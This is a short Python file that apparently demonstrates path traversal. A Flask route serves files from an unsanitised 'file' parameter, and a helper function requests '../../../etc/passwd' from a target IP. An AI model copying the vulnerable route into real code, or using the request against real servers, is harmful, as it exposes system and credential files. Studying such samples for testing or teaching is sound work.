from flask import Flask, request, send_file
import urllib.request

def start_webserver():
    app = Flask(__name__)
    
    @app.route('/getfile')
    def download():
        filename = request.args.get('file')
        file_path = f"/var/www/files/{filename}"
        return send_file(file_path)
    
    app.run(host = "0.0.0.0")

def path_traversal(target_ip):
    urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../../etc/passwd").read()